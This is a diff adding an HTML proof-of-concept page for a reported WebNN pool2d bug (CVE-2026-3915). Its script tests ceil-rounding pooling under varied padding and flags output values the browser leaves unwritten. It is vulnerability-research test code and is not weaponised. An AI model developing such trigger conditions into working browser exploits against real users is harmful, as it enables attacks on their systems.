@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head><title>WebNN pool2d ceil rounding - Padding Variations</title></head>
+<body>
+<h2>WebNN pool2d ceil rounding - Different Padding Values</h2>
+<pre id="output"></pre>
+<script>
+const log = (msg) => {
+  console.log(msg);
+  document.getElementById('output').textContent += msg + '\n';
+};
+
+async function testPaddingVariations() {
+  log('=== PoC 4: Padding variations with ceil rounding ===');
+  log('CVE-2026-3915 triggered when padding={0,0,0,0} + ceil rounding.');
+  log('Testing various padding values to find additional trigger conditions.');
+  log('');
+
+  if (!navigator.ml) {
+    log('ERROR: WebNN API not available');
+    return;
+  }
+
+  let context;
+  try {
+    context = await navigator.ml.createContext({ deviceType: 'gpu' });
+    log('Using GPU/CoreML backend');
+  } catch(e) {
+    try {
+      context = await navigator.ml.createContext({ deviceType: 'cpu' });
+      log('Using CPU backend');
+    } catch(e2) {
+      log('No context: ' + e2.message);
+      return;
+    }
+  }
+
+  const inputShape = [1, 1, 5, 5];
+  const inputSize = 25;
+  const inputData = new Float32Array(inputSize);
+  for (let i = 0; i < inputSize; i++) inputData[i] = i + 1;
+
+  // Test different padding configurations
+  const paddingCases = [
+    { name: 'Zero padding', padding: [0, 0, 0, 0] },
+    { name: 'Symmetric padding 1', padding: [1, 1, 1, 1] },
+    { name: 'Asymmetric padding', padding: [0, 1, 0, 1] },
+    { name: 'Top-left only', padding: [1, 0, 1, 0] },
+    { name: 'Bottom-right only', padding: [0, 1, 0, 1] },
+    { name: 'Large padding', padding: [2, 2, 2, 2] },
+  ];
+
+  for (const pc of paddingCases) {
+    const [pt, pb, pl, pr] = pc.padding;
+    const h = 5 + pt + pb;
+    const w = 5 + pl + pr;
+
+    const floorH = Math.floor((h - 2) / 2) + 1;
+    const floorW = Math.floor((w - 2) / 2) + 1;
+    const ceilH = Math.ceil((h - 2) / 2) + 1;
+    const ceilW = Math.ceil((w - 2) / 2) + 1;
+
+    log(`--- ${pc.name}: padding=[${pc.padding}] ---`);
+    log(`  Effective size: ${h}x${w}`);
+    log(`  Floor: [1,1,${floorH},${floorW}], Ceil: [1,1,${ceilH},${ceilW}]`);
+    log(`  Mismatch: ${(floorH !== ceilH || floorW !== ceilW) ? 'YES' : 'NO'}`);
+
+    for (const poolType of ['average', 'max']) {
+      try {
+        const builder = new MLGraphBuilder(context);
+        const input = builder.input('input', { dataType: 'float32', shape: inputShape });
+
+        let pool;
+        if (poolType === 'average') {
+          pool = builder.averagePool2d(input, {
+            windowDimensions: [2, 2],
+            strides: [2, 2],
+            padding: pc.padding,
+            roundingType: 'ceil',
+            layout: 'nchw'
+          });
+        } else {
+          pool = builder.maxPool2d(input, {
+            windowDimensions: [2, 2],
+            strides: [2, 2],
+            padding: pc.padding,
+            roundingType: 'ceil',
+            layout: 'nchw'
+          });
+        }
+
+        const graph = await builder.build({ 'out': pool });
+        const ceilElements = ceilH * ceilW;
+        const outputBuffer = new Float32Array(ceilElements);
+        outputBuffer.fill(-999.0);
+
+        const results = await context.compute(graph, { 'input': new Float32Array(inputData) }, { 'out': outputBuffer });
+        const output = results.outputs.out || outputBuffer;
+
+        const vals = Array.from(output);
+        const sentinels = vals.filter(v => v === -999.0).length;
+        const nans = vals.filter(v => isNaN(v)).length;
+
+        log(`  ${poolType}Pool2d: output=[${vals.map(v=>v.toFixed(2)).join(', ')}]`);
+        log(`    Sentinels: ${sentinels}, NaNs: ${nans}`);
+
+        if (sentinels > 0) {
+          log(`    *** MISMATCH: ${sentinels} values not written ***`);
+        }
+
+      } catch(e) {
+        log(`  ${poolType}Pool2d ERROR: ${e.message}`);
+      }
+    }
+    log('');
+  }
+
+  log('=== PoC 4 Complete ===');
+}
+
+testPaddingVariations();
+</script>
+</body>
+</html>
